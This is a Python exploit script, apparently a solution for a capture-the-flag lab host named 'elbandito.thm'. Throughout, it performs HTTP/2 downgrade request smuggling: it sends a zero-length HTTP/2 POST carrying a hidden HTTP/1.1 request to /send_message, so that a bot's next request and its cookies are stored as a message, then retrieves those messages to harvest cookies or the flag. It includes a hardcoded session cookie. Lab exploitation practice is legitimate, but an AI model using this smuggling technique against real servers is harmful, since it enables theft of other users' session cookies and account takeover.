#!/usr/bin/env python3
import requests
import ssl
import json
import time
from h2.connection import H2Connection
from h2.events import ResponseReceived, DataReceived, StreamEnded
from hyperframe.frame import SettingsFrame
from socket import socket, AF_INET, SOCK_STREAM

# Configuration
TARGET_HOST = "elbandito.thm"
TARGET_PORT = 80
SESSION_COOKIE = "eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Z-rKtg.CyaOpfDjNdjcJgsJn1FvGXf6dM0"  # Replace with your actual session cookie

def send_h2cl_request():
    """Send an HTTP/2 request that exploits the downgrade via Content-Length"""
    # Create a socket connection
    sock = socket(AF_INET, SOCK_STREAM)
    
    # Wrap with SSL/TLS
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    wrapped_socket = context.wrap_socket(sock, server_hostname=TARGET_HOST)
    
    try:
        # Connect to the target
        wrapped_socket.connect((TARGET_HOST, TARGET_PORT))
        
        # Establish HTTP/2 connection
        conn = H2Connection()
        conn.initiate_connection()
        settings = SettingsFrame(settings={})
        wrapped_socket.sendall(conn.data_to_send())
        
        # Create HTTP/2 headers for the first request
        headers = [
            (':method', 'POST'),
            (':path', '/'),
            (':authority', f'{TARGET_HOST}:{TARGET_PORT}'),
            (':scheme', 'https'),
            ('user-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0'),
            ('cookie', f'session={SESSION_COOKIE}'),
            ('content-type', 'application/x-www-form-urlencoded'),
            # Critical part - setting content-length to 0
            ('content-length', '0')
        ]
        
        # Create the smuggled request as data
        smuggled_data = (
            "POST /send_message HTTP/1.1\r\n"
            f"Host: {TARGET_HOST}:{TARGET_PORT}\r\n"
            f"Cookie: session={SESSION_COOKIE}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 730\r\n\r\n"
            "data="
        )
        
        # Send the request
        stream_id = conn.get_next_available_stream_id()
        conn.send_headers(stream_id, headers, end_stream=False)
        conn.send_data(stream_id, smuggled_data.encode('utf-8'), end_stream=True)
        
        # Send the data out on the wire
        wrapped_socket.sendall(conn.data_to_send())
        
        print("[+] HTTP/2 downgrade request sent successfully")
        
        # Receive response (simplified)
        data = wrapped_socket.recv(65535)
        events = conn.receive_data(data)
        
        for event in events:
            if isinstance(event, (ResponseReceived, DataReceived)):
                print(f"[+] Received response event: {type(event).__name__}")
            if isinstance(event, StreamEnded):
                print("[+] Stream ended")
                
    except Exception as e:
        print(f"[!] Error in HTTP/2 request: {e}")
    finally:
        wrapped_socket.close()

def get_messages():
    """Get messages to check if we captured sensitive information"""
    print("[*] Checking messages for captured data...")
    
    try:
        response = requests.get(
            f"https://{TARGET_HOST}:{TARGET_PORT}/getMessages",
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Cookie": f"session={SESSION_COOKIE}"
            },
            verify=False
        )
        
        print(f"[+] Response status: {response.status_code}")
        
        if response.status_code == 200:
            try:
                messages = response.json()
                print("[+] Message content:")
                print(json.dumps(messages, indent=4))
                
                # Search for flag in messages
                flag_found = False
                for user, user_messages in messages.items():
                    for message in user_messages:
                        # Check if it's a string or dict
                        content = message
                        if isinstance(message, dict) and "message" in message:
                            content = message["message"]
                            
                        # Check for flag or cookie content    
                        if isinstance(content, str):
                            if "flag{" in content.lower():
                                print(f"[+] FLAG FOUND: {content}")
                                flag_found = True
                            elif "cookie:" in content.lower():
                                print(f"[+] POSSIBLE FLAG in cookie: {content}")
                                flag_found = True
                
                if not flag_found:
                    print("[!] No flag found in messages. Inspect the output manually.")
            
            except json.JSONDecodeError:
                print("[!] Not valid JSON. Raw content:")
                print(response.text)
    
    except requests.exceptions.RequestException as e:
        print(f"[!] Error getting messages: {e}")

def main():
    print("[+] El Bandito HTTP/2 Exploitation Script")
    print("[+] Target: " + TARGET_HOST)
    
    # Number of attempts
    attempts = 3
    
    # Execute the exploit multiple times
    for i in range(attempts):
        print(f"[*] Attempt {i+1}/{attempts}")
        send_h2cl_request()
        time.sleep(2)  # Brief pause between attempts
    
    print("[*] Waiting for bot/victim to make a request (approx. 2 minutes)...")
    time.sleep(120)  # Wait for the bot to make a request
    
    # Check for captured data
    get_messages()
    
    print("[+] Exploitation completed")

if __name__ == "__main__":
    main()
